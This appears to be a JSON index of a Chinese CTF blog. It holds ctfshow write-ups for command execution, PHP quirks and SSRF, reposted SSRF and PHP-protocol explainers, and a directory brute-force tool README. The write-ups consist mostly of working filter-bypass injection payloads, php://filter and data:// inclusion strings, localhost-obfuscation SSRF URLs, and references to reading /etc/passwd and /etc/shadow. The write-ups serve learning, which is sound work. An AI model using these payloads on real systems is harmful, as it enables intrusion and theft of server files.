[{"title":"命令执行刷题","url":"/2025/01/11/Yohane-Mashiro/ctfshow/命令执行刷题/","content":"\n### web29\n```payloads\n?c=system(\"cat f???.php\");\n```\n\n### web30\n```payloads\n?c=echo(`ls`);\n?c=echo(`tac%20f*`);\n```\n或者\n```payloads\n?c=eval($_GET[1]);&1=system(\"tac%20flag.php\");\n```\n\n### web31\n```payloads\n?c=eval($_GET[1]);&1=system(\"tac%20flag.php\");\n```\n或者\n```payloads\n?c=echo(tac%09fla*); #使用tab来代替空格\n```\n\n### web32\n\n使用语言结构，绕过（ 的过滤\n常用的语言结构有：echo print include require isset unset\n\n```\n?c=include%0a$_GET[1]?%3E&1=php://filter/convert.base64-encode/resource=flag.php\n```\n利用文件包含的漏洞\n\n### web33\n```\n?c=include%0a$_GET[1]?%3E&1=php://filter/convert.base64-encode/resource=flag.php\n```\n这个也利用文件包含的漏洞\n\n### web34\n```\n?c=include%0a$_GET[1]?%3E&1=php://filter/convert.base64-encode/resource=flag.php\n```\n同上\n\n### web35\n```\n?c=include%0a$_GET[1]?%3E&1=php://filter/convert.base64-encode/resource=flag.php\n```\n同上\n\n### web36\n```\n?c=include%0a$_GET[sb]?%3E&sb=php://filter/convert.base64-encode/resource=flag.php\n```\n同上\n\n### web37\n```\n?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=\n或者\nc=data://text/plain,<?=system('tac fl*.*');?>\n```\n利用php伪协议\n\n### web38\n```\n?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=\n或者\nc=data://text/plain,<?=system('tac fl*.*');?>\n```\n\n### web39\n```\n?c=data://text/plain,<?=system(\"tac fla*.php\");?>//\n```\n\n### web40\n```\n?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));\n```\n\n下面这个是别人写的，比较好\n```\n题解，查看当前工作目录getcwd()，扫描当前目录及文件\"scandir()\"输出 为数组，flag.php 在倒数第二个个位置那就数组倒置array_revers()，变为正数第二，在使用next()函数指向从第一个指向第二个（及指向flag.php）,最后使用show_source（）查看文件的内容 ?c=print_r(show_source(next(array_reverse(scandir(getcwd())))));\nurl+?c=print_r(getcwd()); ===> /var/www/html\nurl+?c=print_r(scandir(getcwd())); ===> Array ( [0] => . [1] => .. [2] => flag.php [3] => index.php )\nurl+?c=print_r(array_reverse(scandir(getcwd()))); ==> Array ( [0] => index.php [1] => flag.php [2] => .. [3] => . )\nurl+?c=print_r(next(array_reverse(scandir(getcwd())))); ==> flag.php\nurl+?c=print_r(show_source(next(array_reverse(scandir(getcwd()))))); ==> $flag=\"ctfshow{eca2e7df-d196-4b71-9632-ad4d32e194d3}\";\n```\n\n### web41\n\n可以使用两个不在正则匹配范围内的非字母非数字的字符进行或运算，从而得到我们想要的字符串\n自己戳脚本\n[这是参考](https://blog.csdn.net/miuzzx/article/details/108569080)\n\n### web42\n\n```\n?c=cat flag.php%0a\n?c=cat flag.php||\n```\n\n### web43\n\n```\n?c=strings flag.php||\n```\n\n### web44\n```\n?c=tac fl?g.???||\n```\n\n### web45\n```\n?c=tac${IFS}f???.php||\n```\n\n### web46\n```\n?c=tac<fl\\ag.php||\n```\n\n### web47\n```\n?c=tac<fl\\ag.php||\n```\n\n### web48\n```\n?c=nl<fla\\g.php||\n```\n\n### web49\n```\n?c=nl<fla''g.php||\n```\n\n### web50\n```\n?c=mor\\e<fla\\g.p\\hp||\n```\n\n### web51\n```\n?c=sor\\t<fla\\g.php||\n```\n\n### web52\n```\n?c=nl${IFS}fla\\g.php||\n```\n\n\n--------\n待补充","tags":["web","刷题","命令执行"],"categories":["Yohane-Mashiro"]},{"title":"php特性刷题","url":"/2025/01/02/Yohane-Mashiro/ctfshow/php特性刷题/","content":"\n### web89\n\n```\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-16 11:25:09\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-18 15:38:51\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if(preg_match(\"/[0-9]/\", $num)){\n        die(\"no no no!\");\n    }\n    if(intval($num)){\n        echo $flag;\n    }\n}\n```\npreg_match:\n    执行一个正则表达式匹配。\nintval():\n    用于获取变量的整数值\n\nintval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。\nPHP 4, PHP 5, PHP 7\n\n如果 base 是 0，通过检测 var 的格式来决定使用的进制：\n如果字符串包括了 \"0x\" (或 \"0X\") 的前缀，使用 16 进制 (hex)；否则，\n如果字符串以 \"0\" 开始，使用 8 进制(octal)；否则，\n将使用 10 进制 (decimal)。\n\n``` 妙妙的用法:\n<?php\necho intval(42);                      // 42\necho intval(4.2);                     // 4\necho intval('42');                    // 42\necho intval('+42');                   // 42\necho intval('-42');                   // -42\necho intval(042);                     // 34\necho intval('042');                   // 42\necho intval(1e10);                    // 10000000000\necho intval('1e10');                  // 10000000000\necho intval(0x1A);                    // 26\necho intval(42000000);                // 42000000\necho intval(420000000000000000000);   // 0\necho intval('420000000000000000000'); // 2147483647\necho intval(42, 8);                   // 42\necho intval('42', 8);                 // 34\necho intval(array());                 // 0\necho intval(array('foo', 'bar'));     // 1\n?>\n```\n\n```payload\nnum[]=1\n```\n\n### web90\n```\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-16 11:25:09\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-18 16:06:11\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\nif(isset($_GET['num'])){\n    $num = $_GET['num'];\n    if($num===\"4476\"){\n        die(\"no no no!\");\n    }\n    if(intval($num,0)===4476){\n        echo $flag;\n    }else{\n        echo intval($num,0);\n    }\n}\n```\n\n```payloads\nnum=0x117c\nnum=4476a\n```\n\n### web91\n\n```\n<?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: Firebasky\n# @Date:   2020-09-16 11:25:09\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-18 16:16:09\n# @link: https://ctfer.com\n\n*/\n\nshow_source(__FILE__);\ninclude('flag.php');\n$a=$_GET['cmd'];\nif(preg_match('/^php$/im', $a)){\n    if(preg_match('/^php$/i', $a)){\n        echo 'hacker';\n    }\n    else{\n        echo $flag;\n    }\n}\nelse{\n    echo 'nonononono';\n}\n\n```\nim模式是可以匹配很多行\ni模式只能匹配一行\n```payloads\ncmd=php%0a1\ncmd=%0aphp\n```","tags":["web","刷题","ctfshow_php特性"],"categories":["Yohane-Mashiro"]},{"title":"常见的php伪协议","url":"/2025/01/02/Yohane-Mashiro/SSRF/php伪协议/","content":"\n转载自[とある晨曦の幻想乡](https://blog.starlit.icu/2025/01/02/web/ssrf/%E7%AE%80%E4%BB%8B/)\n\n### 1. **file:// 协议**\n\n#### **概述**：\n`file://` 是一种用于访问本地文件系统的协议。在 URL 中，它指示访问本地计算机的文件。例如：\n\n- `file:///etc/passwd`（Linux系统中）\n- `file:///C:/Windows/System32/drivers/etc/hosts`（Windows系统中）\n\n它是一个用于本地文件的 URI 协议，表示在本地计算机上读取文件的路径。\n\n#### **常见用途**：\n- **文件访问**：它允许直接访问本地文件系统中的文件。这个协议通常用于 Web 浏览器中查看本地文件。\n- **浏览器功能**：某些浏览器允许用户输入 `file://` URL 来查看本地文件，而不通过HTTP或FTP。\n\n#### **攻击场景**：\n如果 Web 应用没有正确验证和过滤用户输入，攻击者可能构造类似于 `file://` 的路径来访问本地敏感文件。典型攻击案例包括：\n- **读取敏感文件**：攻击者可以提交类似 `file:///etc/passwd`（Linux）或 `file:///C:/Windows/System32/config/systemprofile`（Windows）这样的路径来读取本地敏感文件。\n- **SSRF（Server-Side Request Forgery）攻击**：攻击者通过利用 SSRF 漏洞，将服务器请求引导到本地文件系统，读取服务器上的敏感数据，如 `/etc/shadow`、数据库配置文件等。\n\n\n---\n\n### 2. **dict:// 协议**\n\n#### **概述**：\n`dict://` 协议用于连接到 **Dictionary Protocol** 服务。字典协议（DICT）是一种用于访问在线字典的协议，它允许客户端通过互联网查询词汇定义。`dict://` 协议的 URL 通常用于指示一个字典服务器和要查询的词条。例如：\n\n```\ndict://dict.org/merriam-webster/word\n```\n\n此 URL 会请求连接到 `dict.org` 的字典服务，并查询 `merriam-webster` 词条下的 `word` 内容。\n\n#### **常见用途**：\n- **字典查询**：用户可以通过 `dict://` 协议访问各种公共或私人的字典服务器，获取词汇和术语的定义。\n- **教育和参考**：这种协议可以用于访问科学、技术和文学领域的专业词汇。\n\n#### **攻击场景**：\n虽然 `dict://` 协议本身并不会直接引发严重的安全问题，但如果 Web 应用错误地处理它，可能会导致一些间接的攻击机会。例如：\n- **SSR攻击**：攻击者如果能够控制 Web 应用输入的 URL，可能诱使应用通过 `dict://` 协议访问敏感内网资源（比如某些内部字典服务或数据库），从而泄露数据。\n- **暴露内部字典服务**：某些应用可能通过 `dict://` 协议连接到内部的字典服务，如果攻击者可以操控输入，可能会导致未授权的服务访问，进而泄露信息。\n\n\n---\n\n### 3. **gopher:// 协议**\n\n#### **概述**：\n`gopher://` 协议源自早期的互联网协议 Gopher，它是一种用于信息检索的协议，允许用户通过结构化的层次目录访问信息。虽然 Gopher 协议已经过时，但仍然存在一些遗留的 Gopher 服务器，供用户访问文件、文档等信息。\n\n例如：\n\n```\ngopher://gopher.floodgap.com/1/0/1/textfile.txt\n```\n\n这将连接到一个 Gopher 服务器，下载 `textfile.txt` 文件。\n\n#### **常见用途**：\n- **信息检索**：Gopher 协议原本用于提供结构化的文本和信息检索，类似于早期的网络搜索引擎。\n- **教育和档案**：一些旧的 Gopher 服务仍然在使用，用于存档资料或作为怀旧用途。\n\n#### **攻击场景**：\n与 `file://` 和 `dict://` 协议相比，`gopher://` 协议的安全问题更加隐蔽，可能会被错误地使用或滥用。攻击者可以利用 SSRF 漏洞通过 `gopher://` 协议发起请求，尝试访问内网服务或获取信息。例如：\n- **内部服务扫描**：攻击者可以通过 Gopher 协议扫描目标 Web 应用所在网络中的内网服务。例如，可以利用 `gopher://127.0.0.1:8000` 来访问内网服务。\n- **信息泄露**：攻击者可能通过 Gopher 协议访问目标服务器的未授权端口，泄露敏感的内部信息。\n\n\n---\n","tags":["web","php伪协议","SSRF"],"categories":["Yohane-Mashiro"]},{"title":"SSRF刷题","url":"/2025/01/02/Yohane-Mashiro/ctfshow/SSRF刷题/","content":"\n### web351\n```\nurl=http://127.0.0.1/flag.php\nurl=http://localhost/flag.php\n```\n\n### web352\n\n这里过滤了localhost和127.0.0.1\n```\nurl=http://0/flag.php #在Linux中，0也会被解析成127.0.0.1\nurl=http://127.255.255.254/flag.php \nurl=http://127.1/flag.php #127.1会被解析成127.0.0.1，也就意味着为零可缺省\nurl=http://2130706433/flag.php\n```\n### web353\n\n这里过滤了localhost和127.0.0.1\n```\nurl=http://0/flag.php\nurl=http://2130706433/flag.php\n```\n\n### web354\n```\nurl=http://sudo.cc/flag.php\n```\n查来的，我也不知道为什么。\n\n### web355\n```\nurl=http://0/flag.php\nurl=http://127.1/flag.php\n```\nif((strlen($host)<=5))：长度小于5","tags":["web","刷题","ctfshow_ssrf"],"categories":["Yohane-Mashiro"]},{"title":"SSRF简介","url":"/2025/01/02/Yohane-Mashiro/SSRF/简介/","content":"\n转载自[とある晨曦の幻想乡](https://blog.starlit.icu/2025/01/02/web/ssrf/%E7%AE%80%E4%BB%8B/)\n\n### SSRF（Server-Side Request Forgery，服务器端请求伪造）的原理\n\nSSRF（服务器端请求伪造）是一种攻击技术，攻击者通过操控一个Web应用发起伪造的请求，从而欺骗目标服务器，导致服务器向攻击者指定的地址（可能是外部服务器，也可能是内网地址）发起请求。这类攻击利用了服务器本身的网络访问权限，通常可以绕过防火墙和网络隔离，访问原本无法访问的资源，进而引发数据泄露、系统入侵等安全问题。\n\nSSRF的关键在于通过**操控Web应用的请求机制**来访问原本不可访问的服务。攻击者并不直接与目标服务器交互，而是通过漏洞利用Web服务器发起恶意请求。\n\n### SSRF攻击的工作流程\n\n1. **攻击者输入恶意数据**：攻击者通过Web应用的输入点提交恶意URL或地址。这些输入点通常是用户可以控制的字段，如Web表单、URL参数、文件上传等。\n   \n2. **Web应用发起请求**：Web应用将攻击者提交的恶意输入当作目标URL或地址，并通过后端代码（如HTTP请求库）发起请求。此时，Web应用扮演了请求发起者的角色，攻击者的恶意请求通过Web服务器发起。\n\n3. **恶意请求触发访问**：根据攻击者提供的恶意URL或地址，Web应用可能会访问内部资源（如内网的API、管理接口或数据库服务）或者外部资源（如攻击者控制的恶意网站）。\n   \n4. **返回的响应被利用**：如果Web应用未正确处理这些请求，攻击者可能通过返回的数据进行进一步的攻击，例如泄露敏感信息、获取内网服务的返回数据、进行端口扫描等。\n\n5. **利用网络环境漏洞**：通过SSRF，攻击者可以利用目标服务器的内网权限绕过防火墙、网络隔离等安全策略，访问本不应该暴露的服务和数据。\n\n---\n\n### SSRF的攻击场景\n\nSSRF攻击通常发生在以下几种场景中：\n\n1. **URL输入漏洞**  \n   用户通过Web应用提交一个URL，Web应用会尝试访问这个URL，常见的例子包括：\n   - 允许用户提交URL的文件下载功能\n   - 允许用户输入URL并在Web页面中显示其内容\n   - 通过URL查询外部API或获取资源\n  \n2. **文件上传漏洞**  \n   Web应用可能允许用户上传文件，并对上传的文件进行处理。如果Web应用在文件上传时需要根据上传内容的URL进行请求，攻击者可以上传带有恶意URL的文件（如包含`http://localhost/admin`的图片或其他格式的文件）。\n\n3. **HTTP请求头恶意伪造**  \n   一些应用会根据请求头的内容（如`X-Forwarded-For`、`Host`等）发起请求。攻击者可以伪造这些头信息，诱使Web应用访问内网服务。\n\n4. **其他网络请求功能**  \n   Web应用可能有其他类型的网络请求功能，如发送HTTP请求以获取数据，或在后台进行Web抓取。攻击者可以通过伪造请求的目标来控制访问内网或外部资源。\n\n---\n\n### SSRF攻击的常见利用方法\n\n1. **内网服务扫描**  \n   通过SSRF，攻击者可以扫描目标Web服务器所在的内网，发现本来应该无法访问的内网服务。例如，通过访问`http://localhost:8080`，攻击者可以访问目标服务器的本地管理接口、数据库服务等。\n\n2. **信息泄漏**  \n   SSRF攻击可能导致内部资源的泄漏。例如，攻击者可以通过访问`http://localhost:9200`来扫描和获取Elasticsearch数据库的敏感信息，或通过访问`http://127.0.0.1:5000`获取内网API的返回数据。\n\n3. **端口扫描**  \n   攻击者可以通过控制请求目标地址和端口进行端口扫描，识别目标服务器所在内网的开放端口。例如，攻击者可以利用SSRF通过请求`http://localhost:1-65535`来扫描目标服务器所有的端口。\n\n4. **服务绕过**  \n   有些Web应用配置了IP白名单或防火墙，阻止来自外部的直接访问。攻击者可以通过SSR攻击发起来自Web应用服务器的请求，从而绕过这些安全机制。\n\n5. **利用内网API或管理面板**  \n   Web服务器可能会访问内部的管理系统、API或其他受保护的资源。攻击者通过SSRF访问这些资源，可能会获取敏感数据、执行管理命令或修改系统设置。\n\n---\n\n### SSRF攻击的例子\n\n#### 例子1：URL作为参数\n\n假设有一个Web应用，它允许用户输入一个URL并返回该URL指向的资源。攻击者可以提交恶意的URL，如：\n\n```\nhttp://localhost/admin\n```\n\nWeb应用会尝试从`localhost`请求该资源，而实际上`localhost`是Web服务器的内部地址，可能会导致访问敏感的管理接口，泄露后台管理页面。\n\n#### 例子2：文件上传\n\n假设某个Web应用允许用户上传图片，攻击者上传一个图片文件，并在图片的元数据中嵌入恶意的URL（如`http://127.0.0.1:8080/api`）。当应用处理文件时，它会访问该URL，从而使攻击者能够访问内网资源。\n\n---\n\n### 防御SSRF的策略\n\n1. **限制服务器请求的目标范围**  \n   在Web应用服务器中，使用防火墙或网络访问控制列表（ACL）来限制请求的目标范围，禁止访问`localhost`、`127.0.0.1`、内网IP地址（如`192.168.x.x`、`10.x.x.x`）等。\n\n2. **严格校验输入的URL**  \n   对用户输入的URL进行严格校验，防止请求内网资源。可以通过正则表达式、白名单等方式限制允许的域名和IP地址。拒绝掉本地地址（如`localhost`、`127.0.0.1`等）和不可访问的IP段。\n\n3. **限制HTTP请求头**  \n   在HTTP请求中，某些头信息（如`X-Forwarded-For`、`Host`、`Referer`）可以被恶意伪造。要确保对这些头信息进行严格校验，防止攻击者通过伪造请求头进行绕过。\n\n4. **使用请求代理**  \n   在发起外部请求时，使用请求代理来控制外部请求的来源，减少Web服务器直接发起恶意请求的风险。\n\n5. **输出过滤和响应校验**  \n   对返回的内容进行适当的过滤和检查，确保不泄露内部敏感信息。例如，不应将堆栈信息、错误信息等直接返回给用户。\n\n6. **日志审计**  \n   对Web服务器的请求进行详细日志记录，尤其是外部请求。审计异常请求、未授权访问等，帮助发现潜在的SSRF攻击行为。\n\n---\n","tags":["web","SSRF"],"categories":["Yohane-Mashiro"]},{"title":"目录爆破工具","url":"/2024/12/26/Yohane-Mashiro/project/dri-blast/","content":"\n# dir-blast （目录爆破）\n\n闲的发慌，顺手做了这个小工具\n项目地址：[Ciallo～(∠・ω＜)⌒☆](https://github.com/Yohane-Mashiro/dir-blast)\n一个用于 CTF 的快速目录扫描工具\n希望有用吧\n```\n--------------------------------------------------------------\n|      _   _                  _       _                 _    |\n|   __| | (_)  _ __          | |__   | |   __ _   ___  | |   |\n|  / _` | | | | '__|  _____  | '_ \\  | |  / _` | / __| | __| |\n| | (_| | | | | |    |_____| | |_) | | | | (_| | \\__ \\ | |_  |\n|  \\__,_| |_| |_|            |_.__/  |_|  \\__,_| |___/  \\__| |\n--------------------------------------------------------------\n```\n\n## 功能\n\n- 使用字典文件对目标 URL 进行目录暴力破解\n- 支持多线程，提高扫描速度\n\n## 使用方法\n\n### 从源码运行\n\n1. 克隆仓库到本地：\n    ```sh\n    git clone https://github.com/Yohane-Mashiro/dir-blast.git\n    ```\n2. 进入项目目录：\n    ```sh\n    cd dir-blast\n    ```\n3. 安装依赖：\n    ```sh\n    pip install -r requirements.txt\n    ```\n4. 运行脚本：\n    ```sh\n    python main.py -u <目标URL>\n    ```\n\n### 使用 Release\n\n你也可以从 [Release 页面](https://github.com/Yohane-Mashiro/dir-blast/releases) 下载最新的可执行文件。\n\n## 参数说明\n\n- `-u` 或 `--url`：目标 URL 地址（必填）\n- `-w` 或 `--wordlist`：字典文件路径（默认: `dictionary.txt`）\n- `-t` 或 `--threads`：线程数（默认: 50）\n\n-----","tags":["ctf工具"],"categories":["Yohane-Mashiro"]}]